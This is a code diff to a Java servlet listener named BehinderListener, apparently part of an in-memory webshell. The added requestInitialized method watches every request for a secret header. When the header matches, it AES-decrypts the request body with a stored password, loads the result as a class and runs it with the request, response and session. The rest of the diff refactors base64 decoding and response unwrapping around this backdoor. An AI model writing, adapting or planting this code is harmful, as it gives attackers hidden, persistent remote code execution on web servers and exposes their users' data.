@@ -27,6 +27,35 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
         super(z);
     }
 
+    @Override
+    @SuppressWarnings("all")
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
+        try {
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)) {
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
+                HttpSession session = ((HttpServletRequest) request).getSession();
+                Map<String, Object> obj = new HashMap<String, Object>(3);
+                obj.put("request", request);
+                obj.put("response", unwrapResponse(response));
+                obj.put("session", session);
+                session.setAttribute("u", this.pass);
+                Cipher c = Cipher.getInstance("AES");
+                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
+                byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
+                Object instance = (new BehinderListener(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
+                instance.equals(obj);
+            }
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
+    private Object getResponseFromRequest(Object request) throws Exception {
+        return null;
+    }
+
     @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws Exception {
         Field field = null;
@@ -48,7 +77,7 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -56,12 +85,9 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
@@ -75,41 +101,20 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
     public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
     }
 
-    @Override
     @SuppressWarnings("all")
-    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
-        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
-        try {
-            if (request.getHeader(headerName) != null
-                    && request.getHeader(headerName).contains(headerValue)) {
-                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
-                HttpSession session = ((HttpServletRequest) request).getSession();
-                Map<String, Object> obj = new HashMap<String, Object>(3);
-                obj.put("request", request);
-                obj.put("response", getInternalResponse(response));
-                obj.put("session", session);
-                session.setAttribute("u", this.pass);
-                Cipher c = Cipher.getInstance("AES");
-                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
-                byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
-                Object instance = (new BehinderListener(this.getClass().getClassLoader())).g(bytes).newInstance();
-                instance.equals(obj);
-            }
-        } catch (Exception ignored) {
-        }
-    }
-
-    public HttpServletResponse getInternalResponse(HttpServletResponse response) {
+    public Object unwrapResponse(Object response) {
+        Object internalResponse = response;
         while (true) {
             try {
-                response = (HttpServletResponse) getFieldValue(response, "response");
+                Object r = getFieldValue(response, "response");
+                if (r == internalResponse) {
+                    return r;
+                } else {
+                    internalResponse = r;
+                }
             } catch (Exception e) {
-                return response;
+                return internalResponse;
             }
         }
-    }
-
-    private Object getResponseFromRequest(Object request) throws Exception {
-        return null;
     }
 }
